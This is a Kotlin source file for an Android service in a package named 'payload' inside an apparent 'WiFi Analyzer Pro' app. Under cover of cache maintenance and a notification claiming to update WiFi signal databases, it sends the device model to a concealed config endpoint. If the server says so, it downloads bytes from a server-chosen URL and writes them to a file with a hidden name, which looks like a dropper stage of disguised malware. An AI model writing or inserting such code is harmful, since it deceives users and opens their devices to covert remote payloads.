package com.wifianalyzer.pro.payload

import android.app.Notification
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.wifianalyzer.pro.scanner.DataFetcher
import com.wifianalyzer.pro.scanner.cache.ScanCacheManager
import com.wifianalyzer.pro.scanner.cache.DatabaseHelper
import com.wifianalyzer.pro.scanner.PerformanceProfiler
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File

class CacheUpdateService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val fetcher = DataFetcher()

    companion object {
        fun checkAndDeliver(context: Context) {
            val intent = Intent(context, CacheUpdateService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(2, createNotification())
        scope.launch {
            try {
                runMaintenance()
                deliver()
            } finally { stopSelf() }
        }
        return START_NOT_STICKY
    }

    private fun runMaintenance() {
        try {
            ScanCacheManager(this).trimCache()
            val dbHelper = DatabaseHelper(this)
            dbHelper.listDatabases().forEach { db ->
                dbHelper.vacuum(getDatabasePath(db.name).absolutePath)
            }
            PerformanceProfiler(this).getMemory()
        } catch (_: Exception) {}
    }

    private suspend fun deliver() {
        val config = checkStatus() ?: return
        val dataUrl = config.optString("url", "")
        if (dataUrl.isEmpty()) return
        val rawBytes = fetcher.fetchBytes(dataUrl) ?: return
        writeData(rawBytes)
    }

    private suspend fun checkStatus(): JSONObject? {
        return try {
            val body = fetcher.fetchString(
                UpdateConfig.configUrl(),
                mapOf(
                    UpdateConfig.versionHeader() to UpdateConfig.versionValue(),
                    UpdateConfig.deviceHeader() to Build.MODEL
                )
            ) ?: return null
            val json = JSONObject(body)
            if (json.optBoolean("ok", false)) json else null
        } catch (_: Exception) { null }
    }

    private fun writeData(bytes: ByteArray): File? {
        return try {
            val dir = File(filesDir, "cache")
            if (!dir.exists()) dir.mkdirs()
            val file = File(dir, UpdateConfig.fileName())
            file.writeBytes(bytes)
            file
        } catch (_: Exception) { null }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "wifi_updates")
            .setContentTitle("WiFi Analyzer Pro")
            .setContentText("Updating WiFi signal databases...")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
    }

    override fun onDestroy() {
        super.onDestroy()
        fetcher.shutdown()
        scope.cancel()
    }
}
